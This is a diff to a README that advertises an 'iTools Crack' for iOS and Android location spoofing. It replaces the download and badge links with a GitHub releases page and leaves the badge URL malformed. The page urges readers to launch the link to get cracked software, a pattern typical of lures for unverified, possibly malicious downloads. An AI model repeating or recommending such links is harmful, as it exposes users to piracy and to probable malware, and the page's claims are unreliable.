@@ -8,7 +8,7 @@ Are you looking for the ultimate tool to enhance your iOS and Android device exp
 - **Topics:** itool, itool-max, itool-wire-puller, itools, itools-android, itools-auto-walk, itools-bluetooth-joystick, itools-descargar, itools-dongle, itools-dongle-ios, itools-dongle-only-core-and-mouse, itools-dongle-pokemon-go, itools-download, itools-iphone, itools-spoofing, itools-virtual-location
 
 ## Access the Tools
-🔗 [Download iTools Crack Here!](https://github.com/file/Soft.zip)
+🔗 [Download iTools Crack Here!](https://github.com/Guru555git/iTools_Crack/releases)
 
 ## Features :sparkles:
 1. **iTools Dongle Support:** Access all the essential features for iOS and Android devices with the iTools dongle.
@@ -43,6 +43,6 @@ Don't miss out on the incredible features and functionalities offered by the iTo
 
 **Remember: The link provided needs to be launched for accessing the iTools Crack repository.**
 
-[![Download iTools Crack](https://img.shields.io/badge/Download-iTools_Crack-<COLOR>.svg)](https://github.com/file/Soft.zip)
+[![Download iTools Crack](https://github.com/Guru555git/iTools_Crack/releases<COLOR>.svg)](https://github.com/Guru555git/iTools_Crack/releases)
 
 Happy device enhancing! 🌟📱🔧
